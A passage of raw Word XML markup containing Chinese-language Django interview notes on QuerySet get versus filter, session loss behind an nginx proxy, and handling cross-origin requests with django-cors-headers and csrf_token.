      <w:bookmarkStart w:id="630" w:name="1498-1535455926234"/>
      <w:bookmarkEnd w:id="629"/>
      <w:bookmarkEnd w:id="630"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>029</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w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>里</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>QuerySet</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>方法的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B131EB0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="631" w:name="3445-1535455950383"/>
      <w:bookmarkEnd w:id="631"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1） 输入参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178D00FC" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="632" w:name="6310-1535455950888"/>
      <w:bookmarkEnd w:id="632"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> get 的参数只能是 model 中定义的那些字段，只支持严格匹配。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11856A0F" w14:textId="7138D910" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="633" w:name="2544-1535455950889"/>
      <w:bookmarkEnd w:id="633"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>filter 的参数可以是字段，也可以是扩展的 where 查询关键字，如 in，like 等。</w:t>
      </w:r>
      <w:bookmarkStart w:id="634" w:name="9051-1535455950889"/>
      <w:bookmarkEnd w:id="634"/>
    </w:p>
    <w:p w14:paraId="46428F26" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="635" w:name="5217-1535455950889"/>
      <w:bookmarkEnd w:id="635"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）返回值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027A8C82" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="636" w:name="4736-1535455950889"/>
      <w:bookmarkEnd w:id="636"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> get 返回值是一个定义的 model 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326D19B0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="637" w:name="9212-1535455950889"/>
      <w:bookmarkEnd w:id="637"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>filter 返回值是一个新的 QuerySet 对象，然后可以对 QuerySet 在进行查询返回新的  QuerySet 对象，支持链式操作，QuerySet 一个集合对象，可使用迭代或者遍历，切片等，但是不等于 list 类型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A7A957" w14:textId="79092F2A" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="638" w:name="1037-1535455950889"/>
      <w:bookmarkEnd w:id="638"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(使用一定要注意)。</w:t>
      </w:r>
      <w:bookmarkStart w:id="639" w:name="9584-1535455950889"/>
      <w:bookmarkEnd w:id="639"/>
    </w:p>
    <w:p w14:paraId="5C1831F7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="640" w:name="6152-1535455950889"/>
      <w:bookmarkEnd w:id="640"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3） 异常</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2741B5E3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="641" w:name="3145-1535455950889"/>
      <w:bookmarkEnd w:id="641"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> get 只有一条记录返回的时候才正常，也就说明 get 的查询字段必须是主键或者唯一约束的字段。当返回多条记录或者是没有找到记录的时候都会抛出异常</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEB812F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="642" w:name="1687-1535455950889"/>
      <w:bookmarkEnd w:id="642"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>filter 有没有匹配的记录都可以</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC7B8FF" w14:textId="09D8D3DA"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43" w:name="1838-1535456002588"/>
      <w:bookmarkStart w:id="644" w:name="5275-1535456003265"/>
      <w:bookmarkEnd w:id="643"/>
      <w:bookmarkEnd w:id="644"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>030</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中当一个用户登录</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> A </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>应用服务器（进入登录状态），然后下次请求被</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> nginx</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>代理到</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> B </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>应用服务器会出现什么影响？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4810EF12" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="645" w:name="9739-1535456023632"/>
      <w:bookmarkEnd w:id="645"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果用户在 A 应用服务器登陆的 session 数据没有共享到 B 应用服务器，那么之前的登录状态就没有了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5369D3E1" w14:textId="77777777" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="646" w:name="2787-1535456037447"/>
      <w:bookmarkStart w:id="647" w:name="8164-1535456032801"/>
      <w:bookmarkEnd w:id="646"/>
      <w:bookmarkEnd w:id="647"/>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>016</w:t>
      </w:r>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、什么是跨域请求，其有哪些方式</w:t>
      </w:r>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF24338" w14:textId="77777777" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72098512" w14:textId="77777777" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方式如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7242F98C" w14:textId="69C5B467" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>资源跳转： a链接、重定向、表单提交</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6C735D" w14:textId="784E2C3F" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>资源嵌入： link/script/img/frame/dom等标签，还有样式中background:url()、@font-face()等文件外链</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719261DE" w14:textId="437B83E6" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>脚本请求： js发起的ajax请求、dom和js对象的跨域操作等</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="4CB0569C" w14:textId="5D02C2F0"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031</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跨域请求问题</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> django </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>怎么解决的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC86672" w14:textId="77777777" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="648" w:name="1766-1535456035285"/>
      <w:bookmarkEnd w:id="648"/>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">使用第三方工具 </w:t>
      </w:r>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django-cors-headers</w:t>
      </w:r>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 即可彻底解决</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690F2377" w14:textId="77777777" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注册app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D07668" w14:textId="77777777" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>添加中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523B113F" w14:textId="77777777" w:rsidR="00A07963" w:rsidRDefault="00A07963" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="720"/>
        </w:tabs>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A07963">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>配置运行跨域请求方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A322B80" w14:textId="77777777" w:rsidR="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>具体方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F116F1C" w14:textId="3704B21F" w:rsidR="00A07963" w:rsidRPr="003547BF" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>启用中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE05B1E" w14:textId="01BB97FC" w:rsidR="00A07963" w:rsidRPr="003547BF" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="649" w:name="9369-1535456044994"/>
      <w:bookmarkEnd w:id="649"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>post请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C144E7D" w14:textId="77777777" w:rsidR="00A07963" w:rsidRPr="003547BF" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="650" w:name="6197-1535456044994"/>
      <w:bookmarkEnd w:id="650"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>验证码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1942E626" w14:textId="6EC2241D" w:rsidR="00A07963" w:rsidRPr="00A07963" w:rsidRDefault="00A07963" w:rsidP="00A07963">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="651" w:name="3022-1535456044994"/>
      <w:bookmarkEnd w:id="651"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4、</w:t>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>表单中添加 csrf_token 标签</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="40E3C99F" w14:textId="4AAFCDEF"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52" w:name="4346-1535456045765"/>
      <w:bookmarkStart w:id="653" w:name="4047-1535456047186"/>
